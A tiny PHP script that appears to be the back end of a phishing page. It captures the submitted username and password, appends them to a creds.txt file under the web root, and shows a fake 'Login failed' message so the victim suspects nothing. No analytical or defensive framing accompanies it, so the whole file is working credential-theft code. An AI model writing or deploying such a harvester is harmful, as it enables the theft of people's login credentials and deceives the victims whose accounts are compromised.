<?php
$log = $_POST['user'] . ":" . $_POST['pass'] . "\n";
file_put_contents("/var/www/html/creds.txt", $log, FILE_APPEND);
echo "Login failed. Please try again.";
?>
